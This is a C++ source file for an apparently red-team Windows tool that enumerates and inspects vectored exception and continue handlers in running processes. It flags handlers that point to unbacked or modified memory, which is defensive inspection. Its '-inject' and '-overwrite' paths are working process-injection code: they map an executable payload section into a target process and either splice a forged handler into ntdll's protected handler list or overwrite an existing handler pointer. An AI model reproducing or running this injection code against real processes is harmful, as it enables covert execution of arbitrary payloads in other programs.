#include "Global.hpp"
#include "Utils.hpp"
#include <algorithm>

extern GLOBAL Global = { 0 };

//Prettiest Manny code
VOID GetLocation(HANDLE hProc, PVOID pAddress, int index, LPCWSTR type) {

	SIZE_T			sRet;
	NTSTATUS		STATUS				= 0x00;
	PVOID			pTmp				= nullptr,
					pFree				= nullptr,
					pAlignedAddress		= nullptr;
	HANDLE			hFile				= nullptr;
	UNICODE_STRING* pName				= nullptr;
	
	MEMORY_BASIC_INFORMATION			mbi = { 0 };
	MEMORY_WORKING_SET_EX_INFORMATION	memInfo = { 0 };

	pName = reinterpret_cast<UNICODE_STRING*>(HeapAlloc(GetProcessHeap(), 0, 0x1000));

	STATUS = g_pNtQueryVirtualMemory(hProc, pAddress, MemoryMappedFilenameInformation, pName, 0x1000, &sRet);

	if ( (STATUS == STATUS_FILE_INVALID) || (STATUS == STATUS_INVALID_ADDRESS) ) {

		std::cout << red << "[!] Handler pointing towards unbacked memory!" << std::endl;

		STATUS = g_pNtQueryVirtualMemory(hProc, pAddress, MemoryBasicInformation, &mbi, sizeof(mbi), &sRet);

		if (NT_SUCCESS(STATUS)) {

			Utils::PrintStats(mbi);
		}

		std::cout << reset << std::endl;
	}
	else {

		const wchar_t* name = GET_FILENAMEW_FROM_UNICODE_STRING(pName);

		wchar_t lower[MAX_PATH];
		wcsncpy_s(lower, name, MAX_PATH);
		CharLowerW(lower);

		for (std::vector<std::wstring>::iterator iter = dlls.begin(), end = dlls.end(); iter != end; ++iter) {

			if (*iter == lower) {

				pAlignedAddress = reinterpret_cast<PVOID>(((ULONG_PTR)pAddress & ~(PAGE_SIZE - 1)));

				memInfo.VirtualAddress = pAddress;

				STATUS = g_pNtQueryVirtualMemory(hProc, pAlignedAddress, MemoryWorkingSetExInformation, &memInfo, sizeof(memInfo), &sRet);

				if (NT_SUCCESS(STATUS)) {

					if (memInfo.u1.VirtualAttributes.Valid && !memInfo.u1.VirtualAttributes.SharedOriginal) {

						std::cout << red << "[!] Handler pointing towards a modified knowndll!" << std::endl;

						STATUS = g_pNtQueryVirtualMemory(hProc, pAddress, MemoryBasicInformation, &mbi, sizeof(mbi), &sRet);

						if (NT_SUCCESS(STATUS)) {

							Utils::PrintStats(mbi);
						}
						break;
					}
					std::cout << red << "[!] Handler pointing towards a knowndll! (Might be worth taking a look at it)" << std::endl;
				}
				break;
			}
		}

		std::wcout << wreset << "[+] Location: " << pName->Buffer << wreset << std::endl;
	}

	if (Global.dwDump) {

		DWORD	dwBytesWritten;
		WCHAR	filename[120];

		DWORD	pid = GetProcessId(hProc);

		std::swprintf(filename, 120, L"%d-%s-%d.bin", pid, type, index);
		std::wprintf(L"[+] Name: %s\n", filename);

		hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			std::printf("[!] Error creating dump file: %ld\n", GetLastError());
			goto _End;
		}
		else {

			pTmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Global.dwDump);
			pFree = pTmp;

			if (!ReadProcessMemory(hProc, pAddress, &pTmp, Global.dwDump, nullptr)) {
				std::printf("[!] Error reading handler: %ld\n", GetLastError()); goto _End;
			}

			if (!WriteFile(hFile, &pTmp, Global.dwDump, &dwBytesWritten, nullptr) || Global.dwDump != dwBytesWritten) {
				std::printf("[!] Error writing dump file: %ld\n", GetLastError()); goto _End;
			}
		}
	}

_End:

	if (pName)
		HeapFree(GetProcessHeap(), 0, pName); pName = nullptr;

	if (pFree)
		HeapFree(GetProcessHeap(), 0, pFree); pFree = nullptr;

	if (hFile)
		CloseHandle(hFile);

	return;
}

BOOL MapShit(HANDLE hProc, HANDLE hFile, BOOL bInject, DWORD dwSize, PVOID* pLocal, PVOID* pRemote) {

	SIZE_T			rand = 0;
	DWORD			dwOld = 0;
	NTSTATUS		STATUS = 0x00;
	HANDLE			hSection = nullptr;
	PVOID			pAddrLocal = nullptr,
					pAddrLocal2 = nullptr,
					pAddrRemote = nullptr;

	LARGE_INTEGER	li = { 0 };

	li.LowPart = dwSize;

	if (bInject) {
		li.LowPart += sizeof(VEH_HANDLER_ENTRY) + sizeof(PVOID);
	}

	STATUS = g_pNtCreateSection(&hSection, SECTION_RWX, nullptr, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Creating section failed: 0x%0.8X\n", STATUS);
		return false;
	}

	STATUS = g_pNtMapViewOfSection(hSection, NtCurrentProcess(), &pAddrLocal, 0, 0, nullptr, &rand, ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Mapping local view failed: 0x%0.8X\n", STATUS);
		return false;
	}

	if (hFile != nullptr) {

		if (bInject) {

			pAddrLocal2 = (PVOID)((ULONG_PTR)pAddrLocal + sizeof(VEH_HANDLER_ENTRY) + 2 * sizeof(PVOID));

			if (!ReadFile(hFile, pAddrLocal2, dwSize, nullptr, nullptr)) {
				std::printf("[!] Error reading payload file: %ld\n", GetLastError());
				return false;
			}
		}
		else {

			if (!ReadFile(hFile, pAddrLocal, dwSize, nullptr, nullptr)) {
				std::printf("[!] Error reading payload file: %ld\n", GetLastError());
				return false;
			}
		}
	}
	
	STATUS = g_pNtMapViewOfSection(hSection, hProc, &pAddrRemote, 0, 0, nullptr, &rand, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Mapping remote view failed: 0x%0.8X\n", STATUS);
		return false;
	}

	*pRemote = pAddrRemote;
	*pLocal = pAddrLocal;

	return (*pLocal && *pRemote) ? true : false;
}

VOID ManuallyAddHandler(HANDLE hProc, int type) {

	NTSTATUS	STATUS				= 0x00;
	DWORD		dwOld				= 0,
				dwSize				= 0,
				dwCookie			= 0;
	BOOL		bSuspended			= false;
	ULONG		ulRetLength			= 0,
				ulCrossProcessFlags = 0;
	SIZE_T		sBytesWritten		= 0;
	HANDLE		hFile				= nullptr;
	PVOID		pAddrLocal			= nullptr,
				pAddrRemote			= nullptr,
				pEntryLocation		= nullptr,
				pRemoteHandler		= nullptr,
				pCrossProcessFlags	= nullptr,
				pHandlerList		= Global.pHandlerList;

	PROCESS_BASIC_INFORMATION	pbi = { 0 };
	
	if (type > 1 || type < 0)
		return;

	STATUS = g_pNtQueryInformationProcess(hProc, ProcessCookie, &dwCookie, sizeof(DWORD), &ulRetLength);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Getting cookie failed: 0x%0.8X\n", STATUS);
		return;
	}

	if (Global.lpPayloadFile) {
		
		if (!Utils::GetPayloadInfo(&hFile, &dwSize)) {
			return;
		}	
	}

	if (!MapShit(hProc, hFile, true, dwSize, &pAddrLocal, &pAddrRemote)) {
		return;
	}

	pRemoteHandler = (PVOID)((ULONG_PTR)pAddrRemote + sizeof(VEH_HANDLER_ENTRY) + 2 * sizeof(PVOID));

	STATUS = g_pNtQueryInformationProcess(hProc, ProcessBasicInfo, &pbi, sizeof(pbi), &ulRetLength);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Getting PEB base address failed: 0x%0.8X\n", STATUS);
		return;
	}

	pCrossProcessFlags = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x50);
	if (!ReadProcessMemory(hProc, pCrossProcessFlags, &ulCrossProcessFlags, sizeof(ULONG), &sBytesWritten)) {
		std::printf("[!] Error reading CrossProcessFlags: %ld\n", GetLastError());
		return;
	}

	*(BYTE*)(ULONG_PTR)pAddrLocal = 0x01;
	*(PVOID*)((ULONG_PTR)pAddrLocal + offsetof(VEH_HANDLER_ENTRY, SyncRefs) + sizeof(PVOID)) = pAddrRemote;
	*(PVOID*)((ULONG_PTR)pAddrLocal + offsetof(VEH_HANDLER_ENTRY, VectoredHandler) + sizeof(PVOID)) = Utils::EncodePointerRemote(Global.lpPayloadFile ? pRemoteHandler : Global.pRndPtr, dwCookie);
	*(PVOID*)((ULONG_PTR)pAddrLocal + offsetof(VEH_HANDLER_ENTRY, Entry.Flink) + sizeof(PVOID)) = type ? Global.pVchStart : Global.pVehStart;

	STATUS = g_pNtSuspendProcess(hProc);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Unable to suspend process, editing .mrdata anyway (shit might crash fyi): 0x%0.8X\n", STATUS);
	}
	else {
		bSuspended = true;
	}

	if (!VirtualProtectEx(hProc, pHandlerList, sizeof(VECTORED_HANDLER_LIST), PAGE_READWRITE, &dwOld)) {
		std::printf("[!] Error modifying .mrdata permissions: %ld\n", GetLastError());
		goto _End;
	}

	 pEntryLocation = (PVOID)((ULONG_PTR)pAddrRemote + sizeof(PVOID));

	if (type == 0) {

		if (!WriteProcessMemory(hProc, Global.pVehStart, &pEntryLocation, sizeof(PVOID), &sBytesWritten)) {
			std::printf("[!] Error editing .mrdata: %ld\n", GetLastError());
			goto _End;
		}

		ulCrossProcessFlags |= 0x4;
	}
	else {
		 
		if (!WriteProcessMemory(hProc, Global.pVchStart, &pEntryLocation, sizeof(PVOID), &sBytesWritten)) {
			std::printf("[!] Error editing .mrdata: %ld\n", GetLastError());
			goto _End;
		}

		ulCrossProcessFlags |= 0x8;
	}

	if (!WriteProcessMemory(hProc, pCrossProcessFlags, &ulCrossProcessFlags, sizeof(ULONG), &sBytesWritten)) {
		std::printf("[!] Error modifying CrossProcessFlags: %ld\n", GetLastError());
		goto _End;
	}

	if (!VirtualProtectEx(hProc, pHandlerList, sizeof(VECTORED_HANDLER_LIST), PAGE_READWRITE, &dwOld)) {
		std::printf("[!] Error modifying .mrdata permissions again: %ld\n", GetLastError());
		goto _End;
	}

_End:

	if (bSuspended) {

		STATUS = g_pNtResumeProcess(hProc);
		if (!NT_SUCCESS(STATUS)) {
			std::printf("[!] Unable to resume process: 0x%0.8X\n", STATUS);
		}
	}

	return;
}

VOID OverWriteHandler(HANDLE hProc, PVOID pHandlerEntry, DWORD dwCookie) {

	SIZE_T			rand = 0;
	DWORD			dwOld = 0,
					dwSize = 0;
	PVOID			pAddrLocal = nullptr,
					pNewHandler = nullptr,
					pAddrRemote = Global.pRndPtr,
					pLocation = (PVOID)((ULONG_PTR)pHandlerEntry + 32);

	LARGE_INTEGER	li = { 0 };
	HANDLE			hFile = nullptr;
		

	if (Global.lpPayloadFile) {

		if (!Utils::GetPayloadInfo(&hFile, &dwSize)) {
			return;
		}

		if (!MapShit(hProc, hFile, false, dwSize, &pAddrLocal, &pAddrRemote)) {
			return;
		}
	}

	pNewHandler = Utils::EncodePointerRemote(pAddrRemote, dwCookie);
	
	if (!VirtualProtectEx(hProc, pLocation, sizeof(PVOID), PAGE_READWRITE, &dwOld)) {
		std::printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
		return;
	}

	if (!WriteProcessMemory(hProc, pLocation, &pNewHandler, sizeof(PVOID), &rand)) {
		std::printf("[!] Error overwriting pointer: %ld\n", GetLastError());
		return;
	}

	if (!VirtualProtectEx(hProc, pLocation, sizeof(PVOID), dwOld, &dwOld)) {
		std::printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
		return;
	}

	return;
}

BOOL ProcessHandlerList(HANDLE hProc, PVOID pHandler, PVOID pStart, int idx, const wchar_t* type) {

	VEH_HANDLER_ENTRY		HandlerEntry	= { 0 };
	int						index			= 1;
	NTSTATUS				STATUS			= 0x00;
	DWORD					dwCookie		= 0;
	ULONG					ulRetLength		= 0;
	PVOID					pDecodedPointer = NULL;

	STATUS = g_pNtQueryInformationProcess(hProc, ProcessCookie, &dwCookie, sizeof(DWORD), &ulRetLength);
	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] Getting cookie failed: 0x%0.8X\n", STATUS);
		return false;
	}

	while (true) {

		if (!ReadProcessMemory(hProc, pHandler, &HandlerEntry, sizeof(VEH_HANDLER_ENTRY), nullptr)) {
			std::printf("[!] Error getting %ws entry: %ld\n", type, GetLastError());
			return false;
		}

		if (Global.bOverWrite && index == idx) {
			OverWriteHandler(hProc, pHandler, dwCookie);
		}

		pDecodedPointer = Utils::DecodePointerRemote(HandlerEntry.VectoredHandler, dwCookie);
		std::printf("\n[+] Decoded %ws pointer: 0x%p\n", type, pDecodedPointer);
		GetLocation(hProc, pDecodedPointer, index, type);

		if (HandlerEntry.Entry.Flink == pStart)
			break;
		
		pHandler = HandlerEntry.Entry.Flink;
		index++;
	}
	return true;
}

BOOL VerifyHandler(HANDLE hProc, int type, int idx) {

	NTSTATUS				STATUS		= 0x00;
	DWORD					dwCookie	= 0; 
	ULONG					ulRetLength = 0;
	VECTORED_HANDLER_LIST	HandlerList = { 0 };

	if (type > 1 || type < 0)
		return false;

	if (!ReadProcessMemory(hProc, Global.pHandlerList, &HandlerList, sizeof(VECTORED_HANDLER_LIST), nullptr)) {
		std::printf("[!] Error getting handler list for proc %d: %ld\n", GetProcessId(hProc), GetLastError());
		return false;
	}

	if (type == 0 && HandlerList.FirstExceptionHandler != Global.pVehStart) {
		return ProcessHandlerList(hProc, HandlerList.FirstExceptionHandler, Global.pVehStart, idx, L"VEH");
	}

	if (type == 1 && HandlerList.FirstContinueHandler != Global.pVchStart) {
		return ProcessHandlerList(hProc, HandlerList.FirstContinueHandler, Global.pVchStart, idx, L"VCH");
	}

	return false;
}

NTSTATUS EnumAll(int type) {

	NTSTATUS					STATUS = 0x00;
	ULONG						uRet = 0;
	SYSTEM_PROCESS_INFORMATION* pProcInfo = NULL;
	PVOID						pFreeLater = NULL;
	HANDLE						hTarget = NULL;

	STATUS = g_pNtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &uRet);
	uRet += 1 << 12;
	pProcInfo = (SYSTEM_PROCESS_INFORMATION*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uRet);
	pFreeLater = pProcInfo;

	STATUS = g_pNtQuerySystemInformation(SystemProcessInformation, pProcInfo, uRet, &uRet);

	if (!NT_SUCCESS(STATUS)) {
		std::printf("[!] NtQuerySystemInformation failed: 0x%0.8X\n", STATUS);
		return STATUS;
	}

	while (true) {

		hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, HandleToULong(pProcInfo->UniqueProcessId));

		if (hTarget == nullptr || hTarget == INVALID_HANDLE_VALUE) {

			pProcInfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
			continue;
		}

		if (VerifyHandler(hTarget, type, 0)) {
			std::wcout << L"[+] Process: " << pProcInfo->ImageName.Buffer << L" - " << HandleToULong(pProcInfo->UniqueProcessId) << std::endl;
			std::cout << reset;
		}

		if (!pProcInfo->NextEntryOffset)
			break;

		pProcInfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pFreeLater); pProcInfo = nullptr; pFreeLater = nullptr;

	return STATUS;
}

int wmain() {

	int					argc;
	DWORD				dwTarget;
	NTSTATUS			STATUS = 0x00;
	HANDLE				hTarget = nullptr;
	LPWSTR				cmd = GetCommandLineW();
	LPWSTR*				argv = CommandLineToArgvW(cmd, &argc);

	if (argc <= 1) {
		Utils::PrintHelpnShit();
		return -1;
	}

	if (!Init()) {
		std::cerr << "[?] Someting went wrong" << std::endl;
		ExitProcess(-1);
	}

	Global.pHandlerList = Utils::HandlerList();
	Global.pVehStart = (PVOID)((ULONG_PTR)Global.pHandlerList + 8);
	Global.pVchStart = (PVOID)((ULONG_PTR)Global.pHandlerList + 32);
	Global.bOverWrite = false;
	Global.lpPayloadFile = nullptr;

	Utils::EnableColor();

	for (int i = 0; i < argc; i++) {

		wchar_t* arg = argv[i];

		if (std::wcscmp(arg, L"-debug") == 0) {

			STATUS = Utils::EnableDebug();

			if (!NT_SUCCESS(STATUS)) {
				std::printf("[!] Error setting SeDebug: 0x%0.8X\n", STATUS);
				return -1;
			}
		}
		else if (wcscmp(arg, L"-proc") == 0 && i + 1 < argc) {

			dwTarget = _wtoi(argv[i + 1]);
			hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, dwTarget);

			if (hTarget == nullptr || hTarget == INVALID_HANDLE_VALUE) {
				std::printf("[!] Opening handle to target failed: %ld\n", GetLastError());
				return -1;
			}

			int j = i += 2;
			int type;

			while (j < argc) {

				arg = argv[j];

				if (std::wcscmp(arg, L"-dump") == 0 && j + 1 < argc) {
					Global.dwDump = _wtoi(argv[j + 1]);
					VerifyHandler(hTarget, 0, 0);
					VerifyHandler(hTarget, 1, 0);
					return 0;
				}
				else if ((std::wcscmp(arg, L"-inject") == 0 && j + 2 < argc)) {
					Utils::ParseInput(argv[j + 1], argv[j + 2], &type);
					ManuallyAddHandler(hTarget, type);
					return 0;
				}
				else if (std::wcscmp(arg, L"-overwrite") == 0 && j + 3 < argc) {
					Global.bOverWrite = true;
					int idx = _wtoi(argv[j + 2]);
					Utils::ParseInput(argv[j + 1], argv[j + 3], &type);
					VerifyHandler(hTarget, type, idx);
					return 0;
				}
			}
			VerifyHandler(hTarget, 0, 0);
			VerifyHandler(hTarget, 1, 0);
		}
		else if (std::wcscmp(arg, L"-enum-veh") == 0) {

			STATUS = EnumAll(0);

			if (!NT_SUCCESS(STATUS)) {
				return -1;
			}
		}
		else if (std::wcscmp(arg, L"-enum-vch") == 0) {

			STATUS = EnumAll(1);

			if (!NT_SUCCESS(STATUS)) {
				return -1;
			}
		}
	}
}
